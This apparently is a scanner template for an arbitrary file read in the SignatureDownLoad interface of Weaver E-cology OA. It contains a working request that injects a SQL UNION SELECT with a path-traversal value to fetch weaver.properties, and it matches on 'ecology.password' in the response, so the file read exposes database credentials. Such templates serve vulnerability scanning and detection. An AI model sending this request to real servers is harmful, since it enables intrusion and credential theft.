id: weaver-signaturedownload-lfi
brief:
    title: OA E-Weaver SignatureDownLoad - Arbitrary File Read
    by: SleepingBag945
    level: high
    about: There is an arbitrary file reading vulnerability in the E-Weaver SignatureDownLoad interface of Panwei OA. An attacker can read any file on the server through the vulnerability.
    label:
        - ecology
        - weaver
        - oa
        - lfi
        - vuln
moves:
    - verb: GET
      to:
        - '{{BaseURL}}/weaver/weaver.file.SignatureDownLoad?markId=0%20union%20select%20%27../ecology/WEB-INF/prop/weaver.properties%27'
      signs:
        - "on": word
          has:
            - DriverClasses
            - ecology.password
          in: body
          need: all
        - "on": word
          has:
            - application/octet-stream
            - markPicture.jpg
          in: header
          need: all
        - "on": status
          status:
            - 200
